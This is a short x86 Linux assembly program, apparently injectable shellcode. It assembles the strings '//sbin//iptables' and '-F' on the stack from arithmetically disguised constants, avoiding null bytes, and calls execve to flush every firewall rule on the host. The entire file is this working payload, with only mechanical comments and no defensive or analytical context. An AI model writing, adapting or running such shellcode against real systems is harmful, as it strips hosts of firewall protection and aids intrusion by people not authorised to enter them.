section .text

global _start

_start:
	mov eax, 0x2d5a5a46		; 0x5a462d5a (shifted 16 bits)
	ror eax, 0x10
	push eax
	add eax, 0x191f3f08
	push eax
	sub eax, 0x11f0fbf9
	push eax
	sub eax, 0x32450202
	add eax, 0x2			; avoid null-byte
	push eax
	add eax, 0x3343c0c6
	push eax

	mov esi, esp			; esi -> "//sbin//iptablesZ-FZ" 
	mov ebx, esi			; const char *filename
	cdq						; edx = 0
	mov eax, edx			; eax = 0
	mov byte [esi+16], dl	; null out Z byte: //sbin//iptablesZ -> "//sbin//iptables"
	mov byte [esi+19], dl   ; null out Z byte: -FZ -> "-F"
	push edx				; null-terminatation for argv
	lea eax, [esi+17]		; char *const argv[1] -> "-F"
	push eax				; 
	push esi				; char *const argv[0] -> "//sbin//iptables"
	mov ecx, esp			; char *const argv[] -> "//sbin//iptables", "-F"
	push edx				; NULL byte for envp[]
	mov eax, edx			; eax = 0
	mov edx, esp			; char *const envp[] -> NULL
	add eax, 0xb			; sys_execve
	int	0x80
